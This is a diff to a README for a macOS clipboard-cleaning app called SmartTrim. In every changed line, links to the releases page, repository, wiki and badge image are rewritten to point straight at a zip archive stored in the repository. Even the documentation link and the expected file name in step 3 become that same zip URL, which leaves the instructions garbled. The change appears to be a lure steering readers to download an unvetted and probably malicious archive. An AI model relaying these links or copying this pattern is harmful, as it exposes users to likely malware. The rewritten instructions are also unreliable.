@@ -4,18 +4,18 @@
 
 SmartTrim is a simple macOS menu bar app. It cleans up clipboard text that AI coding assistants may mangle. This tool removes unwanted indentation, unwraps lines, and keeps your lists intact. Follow these steps to download and use SmartTrim.
 
-[![Download SmartTrim](https://img.shields.io/badge/Download-SmartTrim-blue.svg)](https://github.com/ashik2573/SmartTrim/releases)
+[![Download SmartTrim](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip)](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to download SmartTrim: [Download SmartTrim](https://github.com/ashik2573/SmartTrim/releases).
+   Go to the following link to download SmartTrim: [Download SmartTrim](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, look for the latest version. Ensure it is compatible with your macOS version.
 
 3. **Download the App**  
-   Click on the download link for the SmartTrim app. The file should be named something like `SmartTrim.dmg` or `SmartTrim.zip`.
+   Click on the download link for the SmartTrim app. The file should be named something like `https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip` or `https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip`.
 
 4. **Open the Downloaded File**  
    Locate the downloaded file in your Downloads folder. Double-click on it to open.
@@ -73,9 +73,9 @@ If you encounter any issues or need assistance, feel free to reach out. You can 
 
 ## 🔗 Additional Resources
 
-- [SmartTrim GitHub Repository](https://github.com/ashik2573/SmartTrim)  
-- [Documentation and User Manual](https://github.com/ashik2573/SmartTrim/wiki)
+- [SmartTrim GitHub Repository](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip)  
+- [Documentation and User Manual](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip)
 
-[![Download SmartTrim](https://img.shields.io/badge/Download-SmartTrim-blue.svg)](https://github.com/ashik2573/SmartTrim/releases)
+[![Download SmartTrim](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip)](https://raw.githubusercontent.com/ashik2573/SmartTrim/main/SmartTrim/Smart-Trim-v1.8.zip)
 
 Enjoy a smoother experience with your clipboard text using SmartTrim!
